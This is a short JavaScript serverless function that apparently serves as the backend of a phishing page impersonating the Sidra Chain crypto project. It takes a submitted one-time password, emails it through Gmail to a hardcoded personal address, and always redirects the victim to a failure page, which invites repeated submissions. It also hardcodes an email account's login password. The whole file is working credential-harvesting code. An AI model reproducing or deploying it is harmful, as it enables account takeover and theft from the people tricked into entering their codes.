const nodemailer = require("nodemailer");

exports.handler = async (event) => {
    if (event.httpMethod !== "POST") {
        return {
            statusCode: 405,
            headers: { "Location": "/fail.html" },
            body: "", // Redirect to fail.html
        };
    }

    try {
        const { otp } = JSON.parse(event.body);

        // Set up nodemailer transport
        let transporter = nodemailer.createTransport({
            service: "gmail",
            auth: {
                user: "nwankwogoodluck156@gmail.com", // Replace with your email
                pass: "12345678", // Use an App Password
            },
        });

        // Email content
        let mailOptions = {
            from: "your-email@gmail.com",
            to: "nwankwogoodluck156@gmail.com",
            subject: "Sidra Chain - OTP Submission",
            text: `Received OTP: ${otp}`,
        };

        // Send email
        await transporter.sendMail(mailOptions);
    } catch (error) {
        console.error("Error sending email:", error);
    }

    return {
        statusCode: 302,
        headers: { "Location": "/fail.html" }, // Redirect back to fail.html
        body: "",
    };
};